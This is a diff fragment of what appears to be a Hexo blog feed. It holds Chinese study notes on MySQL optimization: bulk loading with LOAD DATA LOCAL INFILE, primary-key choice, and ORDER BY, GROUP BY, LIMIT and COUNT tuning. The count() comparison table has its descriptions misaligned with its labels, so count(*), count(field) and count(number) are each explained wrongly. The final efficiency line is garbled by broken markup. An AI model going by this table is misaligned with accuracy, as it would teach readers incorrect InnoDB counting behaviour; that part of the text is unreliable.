+<p>主键顺序插入，性能要高于乱序插入</p>
+<p>如果一次性需要插入大批量数据(比如: 几百万的记录)，使用insert语句插入性能较低，此时可以使</p>
+<p>用MySQL数据库提供的load指令进行插入。</p>
+<pre><code class="hljs mysql">-- 客户端连接服务端时，加上参数 -–local-infile 
+mysql –-local-infile -u root -p 
+-- 设置全局参数local_infile为1，开启从本地加载文件导入数据的开关 
+set global local_infile &#x3D; 1; 
+-- 执行load指令将准备好的数据，加载到表结构中 
+load data local infile &#39;&#x2F;root&#x2F;sql1.log&#39; into table tb_user fields terminated by &#39;,&#39; lines terminated by &#39;\n&#39; ;</code></pre>
+</li>
+<li><p>4).主键顺序插入，性能要高于乱序插入</p>
+</li>
+</ul>
+<h3 id="主键优化"><a href="#主键优化" class="headerlink" title="主键优化"></a>主键优化</h3><ul>
+<li>满足业务需求的情况下，尽量降低主键的长度。</li>
+<li>插入数据时，尽量选择顺序插入，选择使用AUTO_INCREMENT自增主键。</li>
+<li>尽量不要使用UUID做主键或者是其他自然主键，如身份证号。</li>
+<li>业务操作时，避免对主键的修改。</li>
+</ul>
+<h3 id="order-by优化"><a href="#order-by优化" class="headerlink" title="order by优化"></a>order by优化</h3><p>MySQL的排序，有两种方式：</p>
+<ul>
+<li><p>Using filesort : 通过表的索引或全表扫描，读取满足条件的数据行，然后在排序缓冲区sortbuffer中完成排序操作，所有不是通过索引直接返回排序结果的排序都叫 FileSort 排序。</p>
+</li>
+<li><p>Using index : 通过有序索引顺序扫描直接返回有序数据，这种情况即为 using index，不需要额外排序，操作效率高。</p>
+</li>
+</ul>
+<p>对于以上的两种排序方式，Using index的性能高，而Using filesort的性能低，我们在优化排序操作时，尽量要优化为 Using index。</p>
+<p>order by优化原则:</p>
+<ul>
+<li>A. 根据排序字段建立合适的索引，多字段排序时，也遵循最左前缀法则。</li>
+<li>B. 尽量使用覆盖索引。</li>
+<li>C. 多字段排序, 一个升序一个降序，此时需要注意联合索引在创建时的规则（ASC/DESC）。</li>
+<li>D. 如果不可避免的出现filesort，大数据量排序时，可以适当增大排序缓冲区大小</li>
+<li>sort_buffer_size(默认256k)。 </li>
+</ul>
+<h3 id="group-by优化"><a href="#group-by优化" class="headerlink" title="group by优化"></a>group by优化</h3><p>在分组操作中，我们需要通过以下两点进行优化，以提升性能：</p>
+<ul>
+<li><p>A. 在分组操作时，可以通过索引来提高效率。</p>
+</li>
+<li><p>B. 分组操作时，索引的使用也是满足最左前缀法则的。</p>
+</li>
+</ul>
+<h3 id="limit优化"><a href="#limit优化" class="headerlink" title="limit优化"></a>limit优化</h3><p>优化思路: 一般分页查询时，通过创建 覆盖索引 能够比较好地提高性能，可以通过覆盖索引加子查询形式进行优化。</p>
+<h3 id="count优化"><a href="#count优化" class="headerlink" title="count优化"></a>count优化</h3><p><strong>count的工作原理</strong></p>
+<blockquote>
+<p>MyISAM 引擎把一个表的总行数存在了磁盘上，因此执行 count(*) 的时候会直接返回这个数，效率很高； 但是如果是带条件的count，MyISAM也慢。</p>
+<p>InnoDB 引擎就麻烦了，它执行 count(*) 的时候，需要把数据一行一行地从引擎里面读出来，然后累积计数。</p>
+</blockquote>
+<p><strong>count的用法</strong></p>
+<p>count() 是一个聚合函数，对于返回的结果集，一行行地判断，如果 count 函数的参数不是NULL，累计值就加 1，否则不加，最后返回累计值。</p>
+<p>用法：count（*）、count（主键）、count（字段）、count（数字）</p>
+<table>
+<thead>
+<tr>
+<th>count用法</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>count(主键)</td>
+<td align="left">InnoDB 引擎会遍历整张表，把每一行的 主键id 值都取出来，返回给服务层。服务层拿到主键后，直接按行进行累加(主键不可能为null)。</td>
+</tr>
+<tr>
+<td>count(*)</td>
+<td align="left">没有not null 约束: InnoDB 引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，服务层判断是否为null，不为null，计数累加。<br>有not null 约束: InnoDB引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，直接按行进行累加。</td>
+</tr>
+<tr>
+<td>count(字段)</td>
+<td align="left">InnoDB 引擎遍历整张表，但不取值。服务层对于返回的每一行，放一个数字’1’进去，直接按行进行累加。</td>
+</tr>
+<tr>
+<td>count(数字)</td>
+<td align="left">InnoDB引擎并不会把全部字段取出来，而是专门做了优化，不取值，服务层直接按行累加。</td>
+</tr>
+</tbody></table>
+<p>按照效率排序的话，count(字段) &lt; count(主键 id) &lt; count(1) ≈ count(<em>)，所以尽量使用 count(\</em>)。 </p>
+]]></content>
+      <tags>
+        <tag>mysql</tag>
       </tags>
   </entry>
   <entry>
